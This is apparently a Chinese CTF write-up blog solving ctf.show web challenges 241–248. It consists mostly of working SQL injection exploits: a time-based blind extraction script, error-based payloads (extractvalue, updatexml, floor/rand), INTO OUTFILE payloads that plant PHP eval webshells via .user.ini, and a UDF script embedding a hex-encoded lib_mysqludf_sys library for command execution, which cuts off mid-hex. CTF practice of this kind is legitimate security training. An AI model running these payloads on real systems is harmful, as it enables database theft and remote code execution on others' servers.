<h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409125442979.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409125442979"></p>

<pre><code class="python">&quot;&quot;&quot;
Author:feng
&quot;&quot;&quot;
import requests
from time import *
def createNum(n):
    num = &#39;true&#39;
    if n == 1:
        return &#39;true&#39;
    else:
        for i in range(n - 1):
            num += &quot;+true&quot;
        return num

url=&#39;http://224c4817-ece7-46e4-a9a5-185fdce4e641.chall.ctf.show:8080/api/delete.php&#39;

flag=&#39;&#39;
for i in range(1,100):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            if chr(j)==&#39;&#125;&#39;:
                exit()
            break

        #payload=&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)
        #payload=&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)
        payload=&quot;if(ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)

        data=&#123;
            &#39;id&#39;:payload
        &#125;
        try:
            r=requests.post(url=url,data=data,timeout=0.2)
            min=j
        except:
            max=j

        sleep(0.2)
    sleep(1)
</code></pre>
<h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131541223.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409131541223"></p>

<pre><code>SELECT ... INTO OUTFILE &#39;file_name&#39;
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [&#123;FIELDS | COLUMNS&#125;
        [TERMINATED BY &#39;string&#39;]//分隔符
        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]
        [ESCAPED BY &#39;char&#39;]
    ]
    [LINES
        [STARTING BY &#39;string&#39;]
        [TERMINATED BY &#39;string&#39;]
    ]
</code></pre>
<pre><code>“OPTION”参数为可选参数选项，其可能的取值有：

`FIELDS TERMINATED BY &#39;字符串&#39;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

`FIELDS ENCLOSED BY &#39;字符&#39;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

`FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

`FIELDS ESCAPED BY &#39;字符&#39;`：设置转义字符，只能为单个字符。默认值为“\”。

`LINES STARTING BY &#39;字符串&#39;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

`LINES TERMINATED BY &#39;字符串&#39;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
</code></pre>
<ul>
<li>FIELDS TERMINATED BY</li>
<li>LINES STARTING BY</li>
<li>LINES TERMINATED BY</li>
</ul>
<pre><code>filename=1.php&#39; fields terminated by &#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;#
</code></pre>
<p>接着访问dump&#x2F;1.php</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131756459.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409131756459"></p>

<h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131947051.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409131947051"></p>

<p>有index.php,上传.user.ini,不过要注意一下上传的格式</p>
<p>过滤了php，那么使用.user.ini进行文件包含，传入一个图片马，再使index.php包含图片马即可。具体操作如下：<br>先上传.user.ini(其中在每行开头加了;用于注释掉从表ctfshow_user中读出的内容)：</p>
<pre><code>filename=.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d7a662e6a70670a#
</code></pre>
<p>.user.ini的结果类似于：</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132736975.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409132736975"></p>

<p>再上传图片马</p>
<pre><code>filename=zf.jpg&#39; lines starting by &#39;&lt;?=eval($_POST[zf]);?&gt;&#39;#
</code></pre>
<h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132921712.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409132921712"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132917871.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409132917871"></p>

<p>extractvalue()</p>
<pre><code>api/?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #&amp;page=1&amp;limit=10
</code></pre>
<p>updatexml()</p>
<pre><code>/api/?id=1&#39; or updatexml(1,concat(1,(database())),1) -- #&amp;page=1&amp;limit=10
</code></pre>
<p>floor()</p>
<pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10
</code></pre>
<p>ceil()</p>
<pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10
</code></pre>
<p>round()</p>
<pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10
</code></pre>
<p>都试一下咯</p>
<pre><code>模板
/api/?id=1&#39; or updatexml(1,concat(1,([])),1) -- #&amp;page=1&amp;limit=10

表名
/api/?id=1&#39; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- #&amp;page=1&amp;limit=10

字段名
/api/?id=1&#39; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flag&#39;)),1) -- #&amp;page=1&amp;limit=10

数据 分开读
/api/?id=1&#39; or updatexml(1,concat(1,(select left(flag,30) from ctfshow_flag)),1) -- #&amp;page=1&amp;limit=10        ctfshow&#123;35d09f15-bd71-4970-90c
/api/?id=1&#39; or updatexml(1,concat(1,(select right(flag,27) from ctfshow_flag)),1) -- #&amp;page=1&amp;limit=10            d71-4970-90ca-56b17f14ccb0&#125;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135233790.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409135233790"></p>

<h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135326914.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409135326914"></p>

<pre><code>api/?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #&amp;page=1&amp;limit=10
</code></pre>
<pre><code>模板
api/?id=1&#39; and extractvalue(1,concat(0x7e,([]),0x7e))-- #&amp;page=1&amp;limit=10

表名
api/?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #&amp;page=1&amp;limit=10

字段名
api/?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39;),0x7e))-- #&amp;page=1&amp;limit=10

数据 分开读
api/?id=1&#39; and extractvalue(1,concat(0x7e,(select left(flag1,30) from ctfshow_flagsa),0x7e))-- #&amp;page=1&amp;limit=10            ctfshow&#123;1232f3e3-1688-483c-a48
api/?id=1&#39; and extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e))-- #&amp;page=1&amp;limit=10            3-1688-483c-a483-990657e35c81&#125;
</code></pre>
<h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135940440.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409135940440"></p>

<pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10
</code></pre>
<pre><code>模板
/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,([]),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10

表名
/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10

字段名
/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;ctfshow_flags&#39; limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10

数据
/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10
</code></pre>
<h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409140732039.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409140732039"></p>

<pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10

/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10
</code></pre>
<pre><code>模板
/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,([]),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10

表名
/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10

字段名
/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39; limit 1,1),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10

数据
/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select `flag?` from ctfshow_flagsa),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10
</code></pre>
<p>可以看到这个字段名<code>flag?</code>加了反引号，原因是：表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字段.表名、字段名、数据库名等可用反引号 ( &#96; )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错</p>
<h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h2 id="udf注入"><a href="#udf注入" class="headerlink" title="udf注入"></a>udf注入</h2><pre><code class="python">#参考脚本
#环境：Linux/MariaDB
import requests
 
url=&#39;http://89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080/api/?id=&#39;
code=&#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420